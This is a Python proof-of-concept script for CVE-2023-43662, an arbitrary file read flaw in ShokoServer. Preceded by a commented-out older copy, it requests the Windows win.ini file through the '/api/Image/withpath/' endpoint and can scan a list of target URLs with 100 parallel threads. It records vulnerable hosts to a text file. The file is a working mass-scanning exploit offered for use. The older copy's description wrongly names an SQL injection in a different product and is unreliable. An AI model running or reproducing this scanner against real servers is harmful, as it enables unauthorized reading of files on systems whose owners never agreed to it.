# import sys
# import argparse
# import requests
# import logging
# import re
# from multiprocessing.dummy import Pool
#
# requests.packages.urllib3.disable_warnings()
# # 设置日志记录
# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# logger = logging.getLogger(__name__)
#
#
# def banner():
#     banner = r"""
#      .----------------.  .----------------.  .----------------.  .----------------.  .----------------.   .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.
# | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. | | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
# | |    _______   | || |  ____  ____  | || |     ____     | || |  ___  ____   | || |     ____     | | | |    _______   | || |  _________   | || |  _______     | || | ____   ____  | || |  _________   | || |  _______     | |
# | |   /  ___  |  | || | |_   ||   _| | || |   .'    `.   | || | |_  ||_  _|  | || |   .'    `.   | | | |   /  ___  |  | || | |_   ___  |  | || | |_   __ \    | || ||_  _| |_  _| | || | |_   ___  |  | || | |_   __ \    | |
# | |  |  (__ \_|  | || |   | |__| |   | || |  /  .--.  \  | || |   | |_/ /    | || |  /  .--.  \  | | | |  |  (__ \_|  | || |   | |_  \_|  | || |   | |__) |   | || |  \ \   / /   | || |   | |_  \_|  | || |   | |__) |   | |
# | |   '.___`-.   | || |   |  __  |   | || |  | |    | |  | || |   |  __'.    | || |  | |    | |  | | | |   '.___`-.   | || |   |  _|  _   | || |   |  __ /    | || |   \ \ / /    | || |   |  _|  _   | || |   |  __ /    | |
# | |  |`\____) |  | || |  _| |  | |_  | || |  \  `--'  /  | || |  _| |  \ \_  | || |  \  `--'  /  | | | |  |`\____) |  | || |  _| |___/ |  | || |  _| |  \ \_  | || |    \ ' /     | || |  _| |___/ |  | || |  _| |  \ \_  | |
# | |  |_______.'  | || | |____||____| | || |   `.____.'   | || | |____||____| | || |   `.____.'   | | | |  |_______.'  | || | |_________|  | || | |____| |___| | || |     \_/      | || | |_________|  | || | |____| |___| | |
# | |              | || |              | || |              | || |              | || |              | | | |              | || |              | || |              | || |              | || |              | || |              | |
# | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' | | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
#  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'   '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
#
#
#     """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="医药信息管理系统GetLshByTj存在SQL注入")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#         # if poc(args.url):
#         #     exp(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload = "/api/Image/withpath/C:\Windows\win.ini"
#     headers = {
#         "User-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64;rv": "127.0)Gecko/20100101Firefox/127.0",
#         "Accept": "application/json,text/javascript,*/*;q=0.01",
#         "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
#         "Accept-Encoding": "gzip,deflate",
#         "Connection": "close",
#     }
#     try:
#         res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=10)
#         if res1.status_code == 200:
#             logger.info(f"[+] {target} 存在任意文件读取漏洞(CVE-2023-43662)")
#             with open("shockre.txt", "a", encoding='utf-8') as f:
#                 f.write(target + "\n")
#         else:
#             logger.info(f"[-] {target} 不存在任意文件读取漏洞(CVE-2023-43662)")
#             return False
#     except Exception as e:
#         logger.error(f"[-] {target} 任意文件读取漏洞(CVE-2023-43662)检测失败: {e}")
#         return False
#
#
# if __name__ == '__main__':
#     main()

import sys
import argparse
import requests
import logging
from multiprocessing.dummy import Pool

# 禁用urllib3的警告
requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|
                               
                               



                            version:1.1.0
                            author:fangwei   

    """
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description="ShokoServer系统withpath任意文件读取漏洞(CVE-2023-43662)")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = "/api/Image/withpath/C:\\Windows\\win.ini"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
    }
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    try:
        res1 = requests.get(url=target + payload, headers=headers, verify=False, timeout=10)
        if res1.status_code == 200 and "fonts" in res1.text:
            logger.info(f"[+] {target} 存在任意文件读取漏洞(CVE-2023-43662)")
            with open("shockre.txt", "a", encoding='utf-8') as f:
                f.write(target + "\n")
        else:
            logger.info(f"[-] {target} 不存在任意文件读取漏洞(CVE-2023-43662)")
            return False
    except Exception as e:
        logger.error(f"[-] {target} 任意文件读取漏洞(CVE-2023-43662)检测失败: {e}")
        return False


if __name__ == '__main__':
    main()
